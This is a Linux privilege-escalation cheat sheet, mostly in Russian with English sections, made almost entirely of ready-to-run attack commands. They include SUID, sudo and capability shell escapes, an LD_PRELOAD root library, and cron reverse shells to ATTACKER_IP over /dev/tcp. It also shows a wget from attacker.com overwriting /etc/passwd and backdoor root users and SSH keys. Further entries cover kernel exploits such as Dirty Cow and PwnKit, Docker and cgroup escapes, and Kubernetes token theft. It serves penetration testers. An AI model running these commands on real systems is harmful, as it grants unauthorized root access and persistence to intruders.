# Sudo, SUID, возможности (capabilities)

Команды повышения привилегий в Linux для sudo, SUID, capabilities, cron, контейнеров и ограниченных оболочек, а также восстановление паролей локальной консоли.

**Что такое повышение привилегий в Linux?**

Повышение привилегий в Linux означает пересечение границы пользователя или службы за счёт ошибки конфигурации либо уязвимого компонента. Полезные зацепки: привилегированные исполняемые файлы, файлы, доступные на запись и используемые привилегированными задачами, и делегированные права на выполнение команд. Прежде чем считать находку путём повышения привилегий, проверьте владельца, контекст выполнения и фактический доступ на запись.

Результаты перечисления нужно интерпретировать с учётом действующего UID, групп и контекста пространства имён. Одна лишь строка версии ядра не доказывает наличие возможности эксплуатации.

Базовая информация об учётной записи и ядре.

```
id && whoami && hostname && uname -a
```

Список пользователей, имеющих возможность входа в систему.

```
cat /etc/passwd | grep -v nologin | grep -v false
```

Список привилегий sudo для текущего пользователя — ключевая отправная точка для повышения привилегий.

```
sudo -l
```

Список всех заданий cron.

```
cat /etc/crontab && ls -la /etc/cron.*
```

Поиск всех бинарников с установленным битом SUID.

```
find / -perm -u=s -type f 2>/dev/null
```

Поиск всех бинарников с установленным битом SGID.

```
find / -perm -g=s -type f 2>/dev/null
```

Поиск бинарников с установленными возможностями (capabilities) Linux.

```
getcap -r / 2>/dev/null
```

Поиск файлов, доступных на запись всем пользователям (world-writable).

```
find / -writable -type f 2>/dev/null | grep -v proc
```

Проверка переменных окружения и истории оболочки.

```
env && cat ~/.bash_history && cat ~/.bashrc
```

Версия ядра для поиска подходящих эксплойтов.

```
cat /proc/version && cat /etc/issue && uname -r
```

Запущенные процессы, принадлежащие root.

```
ps aux | grep root
```

Прослушиваемые порты — внутренние службы, не доступные извне.

```
ss -tlnp && netstat -tlnp 2>/dev/null
```

Поиск паролей в доступных на чтение конфигурационных файлах.

```
find / -name "*.conf" -readable 2>/dev/null | xargs grep -l "password" 2>/dev/null
```

Рекурсивный поиск упоминаний паролей в каталоге.

```
grep -Rni "password" /var/www 2>/dev/null
```

Чтение файла sudoers, если он доступен.

```
cat /etc/sudoers 2>/dev/null && cat /etc/sudoers.d/* 2>/dev/null
```

Проверка скрытых файлов (dotfiles) в домашнем каталоге на наличие учётных данных.

```
ls -la /home/*/.*
```

Поиск закрытых ключей SSH.
```
find / -name id_rsa -o -name id_ecdsa -o -name id_ed25519 2>/dev/null
```

Поиск SUID — выполнение оболочки с привилегиями SUID.

```
/usr/bin/find . -exec /bin/sh -p \;
```

vim с SUID — запуск оболочки изнутри vim.

```
vim -c ":!/bin/sh"
```

python с SUID — выполнение оболочки с сохранением SUID.

```
python3 -c "import os; os.execl('/bin/sh', 'sh', '-p')"
```

perl с SUID — выполнение оболочки.

```
perl -e 'exec "/bin/sh";'
```

ruby с SUID — выполнение оболочки.

```
ruby -e 'exec "/bin/sh"'
```

awk с SUID — вызов системной команды для запуска оболочки.

```
awk 'BEGIN {system("/bin/sh")}'
```

less с SUID — выход в оболочку через команду `!`.

```
less /etc/passwd
!/bin/sh
```

`nmap` (старые версии) с SUID — выход в оболочку через интерактивный режим.

```
nmap --interactive
nmap> !sh
```

`bash` с SUID — флаг `-p` сохраняет действующий UID.

```
bash -p
```

`cp` с SUID — копирование bash с установкой бита SUID и последующим его запуском.

```
cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash
/tmp/rootbash -p
```

`tar` с SUID — выполнение оболочки через checkpoint-действие.

```
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

`node` с SUID — запуск оболочки.

```
node -e "require('child_process').spawn('/bin/sh', {
  stdio: [0,1,2]
})"
```

`env` с SUID — сохранение действующего UID.

```
env /bin/sh -p
```

`strace` с SUID — запуск оболочки под strace с сохранением SUID.

```
strace -o /dev/null /bin/sh -p
```

`tclsh` с SUID — выполнение оболочки с перенаправлением ввода-вывода.

```
tclsh
exec /bin/sh <@stdin >@stdout 2>@stderr
```

NOPASSWD для vim — открытие оболочки из командного режима vim.

```
# sudo -l output → (root) NOPASSWD: /bin/vim
sudo vim -c ":!/bin/bash"
```

NOPASSWD для find — запуск оболочки через `-exec`.

```
# sudo -l → (root) NOPASSWD: /usr/bin/find
sudo find . -exec /bin/sh \; -quit
```

NOPASSWD для python3 — системный вызов bash.

```
# sudo -l → (root) NOPASSWD: /usr/bin/python3
sudo python3 -c "import os; os.system('/bin/bash')"
```

NOPASSWD для less — выход в оболочку через `!` в утилите `less`.

```
# sudo -l → (root) NOPASSWD: /usr/bin/less
sudo less /etc/passwd
!/bin/sh
```

Обход sudo через `-u#-1` (CVE-2019-14287) — актуально для sudo < 1.8.28.

```
# sudo -l → (ALL, !root) /bin/bash
# CVE-2019-14287: sudo < 1.8.28 bypass
sudo -u#-1 /bin/bash
```

Злоупотребление LD_PRELOAD — требует `env_keep` в sudoers.

```
# LD_PRELOAD trick (requires env_keep += LD_PRELOAD in sudoers)
cat > /tmp/evil.c << EOF
#include <stdio.h>
#include <unistd.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setuid(0); setgid(0);
    system("/bin/bash");
}
EOF
gcc -fPIC -shared -nostartfiles -o /tmp/evil.so /tmp/evil.c
sudo LD_PRELOAD=/tmp/evil.so <allowed_command>
```

NOPASSWD для wget — перезапись `/etc/passwd`.

```
# sudo -l → (root) NOPASSWD: /usr/bin/wget
sudo wget http://attacker.com/passwd -O /etc/passwd
```

NOPASSWD для tee — добавление нового пользователя root в `/etc/passwd`.

```
# sudo -l → (root) NOPASSWD: /usr/bin/tee
echo "root2:$(openssl passwd -1 password):0:0:root:/root:/bin/bash" | sudo tee -a /etc/passwd
```

Перехват пути скрипта — внедрение в подключаемый (sourced) файл.

```
# sudo -l → (root) /bin/bash /path/to/script.sh
# If script sources a file in a writable dir:
echo "bash -i" > /writable/path/sourced.sh
```

NOPASSWD для git — выход в оболочку через пейджер.

```
# sudo -l → (root) NOPASSWD: /usr/bin/git
sudo git -p help config
!/bin/sh
```

NOPASSWD для zip — выход в оболочку через параметр `-TT unzip-command`.

```
# sudo -l → (root) NOPASSWD: /usr/bin/zip
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T --unzip-command="sh -c /bin/sh"
```

NOPASSWD для apt-get — вызов оболочки через хук Pre-Invoke

```
# sudo -l → (root) NOPASSWD: /usr/bin/apt-get
sudo apt-get update -o APT::Update::Pre-Invoke::="/bin/sh"
```

Перечисление всех заданий cron — поиск скриптов, доступных на запись.

```
cat /etc/crontab
crontab -l
ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/
cat /var/spool/cron/crontabs/*
```

Дописывание обратной оболочки в cron-скрипт, доступный на запись всем пользователям.

```
# If cron runs /opt/cleanup.sh as root and file is world-writable:
echo "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" >> /opt/cleanup.sh
```

Перехват PATH — когда cron вызывает команду по относительному имени (без полного пути).
```
# If cron uses relative PATH and /tmp is writable:
# crontab: * * * * * backup.sh
export PATH=/tmp:$PATH
echo "#!/bin/bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" > /tmp/backup.sh
chmod +x /tmp/backup.sh
```

Инъекция через подстановочные знаки `tar` с использованием checkpoint-флагов.
```
# Wildcard injection in cron tar command:
# * * * * * root tar czf /backup.tgz /opt/data/*
cd /opt/data
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh revshell.sh"
echo "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" > revshell.sh
chmod +x revshell.sh
```

Создание нового задания `cron` от `root`, если каталог `cron.d` доступен на запись.

```
# Writable cron.d directory:
echo "* * * * * root bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" > /etc/cron.d/backdoor
```

Добавление нового пользователя `root` в доступный на запись `/etc/passwd`.

```
# /etc/passwd writable → add new root user
echo "hacker:$(openssl passwd -1 -salt xyz hacked):0:0:root:/root:/bin/bash" >> /etc/passwd
su hacker  # password: hacked
```

Замена хэша `root` в доступном на запись `/etc/shadow`.

```
# /etc/shadow writable → replace root password hash
python3 -c "import crypt; print(crypt.crypt('password', crypt.mksalt(crypt.METHOD_SHA512)))"
# Replace root hash in /etc/shadow
```

Добавление `NOPASSWD: ALL` в доступный на запись файл sudoers.

```
# /etc/sudoers writable → add NOPASSWD rule
echo "$(id -un) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
sudo bash
```

Поиск файлов, принадлежащих root и доступных на запись всем пользователям.

```
# Find files owned by root but writable by current user:
find / -user root -writable -type f 2>/dev/null | grep -v proc
```

Добавление открытого ключа SSH в `authorized_keys` пользователя root.

```
# Append SSH key to root authorized_keys (if ~/.ssh writable):
mkdir -p /root/.ssh
echo "<your_public_key>" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
```

Перечисление и анализ опасных возможностей (capabilities).

```
# Find capabilities:
getcap -r / 2>/dev/null

# Dangerous capabilities:
# cap_setuid+ep → set UID to 0
# cap_net_raw+ep → raw socket access
# cap_sys_admin+ep → near-root
# cap_dac_read_search+ep → bypass file read checks
```

python3 с `cap_setuid` — установка UID в 0 и запуск bash.

```
# python3 with cap_setuid+ep:
python3 -c "import os; os.setuid(0); os.system('/bin/bash')"
```

perl с `cap_setuid` — повышение привилегий до root.

```
# perl with cap_setuid+ep:
perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'
```

vim cap_setuid — use Python to setuid and spawn shell

```
# vim with cap_setuid+ep:
vim -c ":py3 import os; os.setuid(0); os.execl('/bin/bash', 'bash', '-p')"
```

node cap_setuid — set UID to 0 and spawn shell

```
# node with cap_setuid+ep:
node -e "process.setuid(0); require('child_process').spawn('/bin/bash', {stdio: [0,1,2]})"
```

tar cap_dac_read_search — read /etc/shadow

```
# tar with cap_dac_read_search — read any file:
tar xf /etc/shadow -I cat
```

openssl cap_setuid — load malicious engine to escalate
```
# openssl with cap_setuid:
openssl req -engine /tmp/evil.so
```

Dirty Cow CVE-2016-5195 — overwrite /etc/passwd via PTRACE_POKETEXT

```
# Dirty Cow (CVE-2016-5195) — kernel < 4.8.3
# Overwrite any file (e.g., /etc/passwd)
wget https://github.com/firefart/dirtycow/raw/master/dirty.c
gcc -pthread dirty.c -o dirty -lcrypt
./dirty <password>
# Creates /etc/passwd entry for firefart:password with root UID
```

Dirty Pipe CVE-2022-0847 — overwrite SUID binaries to add shell backdoor

```
# Dirty Pipe (CVE-2022-0847) — kernel 5.8 to 5.16.11
# Overwrite read-only files
# PoC: https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits
./exploit /usr/bin/sudo
```

PwnKit CVE-2021-4034 — pkexec out-of-bounds write → root

```
# PwnKit (CVE-2021-4034) — pkexec privilege escalation
# Affects polkit pkexec 0.105 and earlier (most distros before Jan 2022)
# PoC: https://github.com/ly4k/PwnKit
./PwnKit  # spawns root shell
```

overlayfs CVE-2023-0386 — FUSE + overlayfs SUID file bypass

```
# overlayfs (CVE-2023-0386) — kernel < 6.2
# Unprivileged user namespace + overlayfs to escalate
# PoC: https://github.com/xkaneiki/CVE-2023-0386
./poc
```

linux-exploit-suggester.sh — match kernel version to known exploits

```
# Automated kernel exploit suggester:
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
bash linux-exploit-suggester.sh

# Alternatively, run on local machine:
bash les.sh --kernelmode --uname "$(uname -r)"
```

Detect Docker container and check if privileged

```
# Check if inside Docker:
cat /proc/1/cgroup | grep docker
ls /.dockerenv

# Check if privileged:
cat /proc/self/status | grep -i cap
# CapEff: 0000003fffffffff = full capabilities (privileged)
```

Privileged container: mount host drive and chroot

```
# Privileged container — mount host filesystem:
mkdir /mnt/host
mount /dev/sda1 /mnt/host
chroot /mnt/host bash
# Now in root shell on host filesystem
```

docker.sock escape — launch new privileged container with host root mount
```
# Docker socket escape (if /var/run/docker.sock is accessible):
ls -la /var/run/docker.sock

docker run -v /:/host --rm -it ubuntu chroot /host bash
# Spawns root shell on host via new privileged container
```

cgroups v1 notify_on_release RCE as host root
```
# cgroups v1 notify_on_release escape (CVE-2022-0492 style):
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -1))
mkdir -p $d/w; echo 1 > $d/w/notify_on_release
t=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
touch /o; echo $t/c > $d/release_agent
echo "#!/bin/sh" > /c; echo "id > $t/o" >> /c; chmod +x /c
sh -c "echo 0 > $d/w/cgroup.procs"; sleep 1; cat /o
```

K8s service account token — enumerate cluster secrets
```
# Kubernetes: extract service account token:
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Use token to call API server:
KUBE_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -sSk -H "Authorization: Bearer $KUBE_TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces/default/secrets
```

A remote command may bypass an interactive restricted-shell startup only when SSH policy permits it; it does not bypass a forced command. Replace `USER` and `HOST`.

Discover commands available in the restricted Bash environment

```
compgen -c
```

Request Bash without its interactive startup files

```
ssh -t USER@HOST 'bash --noprofile --norc'
```

Restore a usable PATH after leaving the restricted shell

```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

At a Python prompt, `import os; os.system('/bin/bash')` uses the same process identity. The Python example under Sudo Misconfigurations gains privileges only when sudo policy grants them. Reuse the existing tar checkpoint example under SUID / SGID Binaries when that executable is available. Sources: [Bash restricted-shell behavior](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html), [OpenSSH client](https://man.openbsd.org/ssh).

Requires console access, permission to edit the GRUB boot entry, and an accessible root filesystem. Disk encryption still requires its unlock secret. In GRUB, press `e`, retain the existing kernel/root parameters, replace `ro` with `rw`, and append `init=/bin/bash` to the `linux` line. Boot the temporary entry with Ctrl-X or F10.

Kernel parameters in the GRUB entry, not a shell command

```
rw init=/bin/bash
```

Reset a local account from the recovery root shell

```
mount -o remount,rw /
passwd USERNAME
sync
mount -o remount,ro /
/sbin/reboot -f
```

Boot normally afterward; the edited entry is temporary. Initramfs, separate filesystems, or SELinux can require the distribution's recovery procedure. Sources: [GRUB editing](https://www.gnu.org/software/grub/manual/grub/grub.html), [Linux kernel parameters](https://docs.kernel.org/admin-guide/kernel-parameters.html).